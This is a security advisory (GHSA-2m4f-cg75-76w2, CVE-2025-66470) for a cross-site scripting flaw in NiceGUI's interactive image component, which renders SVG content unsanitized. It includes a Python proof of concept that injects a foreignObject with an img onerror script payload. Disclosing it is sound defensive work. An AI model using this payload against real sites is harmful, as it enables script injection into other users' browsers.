# [M] NiceGUI Stored/Reflected XSS in ui.interactive_image via unsanitized SVG content

## Summary
Severity: Medium
Advisory: GHSA-2m4f-cg75-76w2
CVE: CVE-2025-66470
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2025-12-08
Source: https://github.com/advisories/GHSA-2m4f-cg75-76w2
Type: github-advisory

## Affected
- PyPI: `nicegui` — affected >=0 <3.4.0

## Details
### Summary
A Cross-Site Scripting (XSS) vulnerability exists in the `ui.interactive_image` component of NiceGUI (v3.3.1 and earlier). The component renders SVG content using Vue's `v-html` directive without any sanitization. This allows attackers to inject malicious HTML or JavaScript via the SVG `<foreignObject>` tag.

### Details
The vulnerability is located in `nicegui/elements/interactive_image.js`.
The component uses the following code to render content:
```javascript
<g v-html="content"></g>
```
Vue's v-html directive renders raw HTML strings into the DOM. If an application allows user-controlled input to be passed to the content property of an interactive image, an attacker can embed a <foreignObject> tag containing malicious scripts, bypassing typical image restrictions.

### PoC
```python
from nicegui import ui

@ui.page('/')
def main():
    ui.label('NiceGUI SVG XSS PoC')
    
    # Standard image loading
    img = ui.interactive_image('[https://picsum.photos/640/360](https://picsum.photos/640/360)')
    
    # Payload: Embeds raw HTML execution inside SVG
    # This executes immediately when the image component is rendered
    img.content = (
        '<foreignObject>'
        '<body xmlns="[http://www.w3.org/1999/xhtml](http://www.w3.org/1999/xhtml)">'
        '<img src=x onerror=alert("XSS-SVG")>'
        '</body>'
        '</foreignObject>'
    )

ui.run()
```

### Impact
- Type: Reflected / Stored XSS (depending on data source)

- Severity: Moderate

- Impact: Attackers can inject malicious scripts that execute whenever the image component is rendered or updated. This is particularly dangerous for dashboards or multi-user applications displaying user-generated content or annotations.

## References
- https://github.com/zauberzeug/nicegui/security/advisories/GHSA-2m4f-cg75-76w2
- https://nvd.nist.gov/vuln/detail/CVE-2025-66470
- https://github.com/zauberzeug/nicegui/commit/58ad0b36e19922de16bbc79ea3ddd29851b1a3e3
- https://github.com/zauberzeug/nicegui
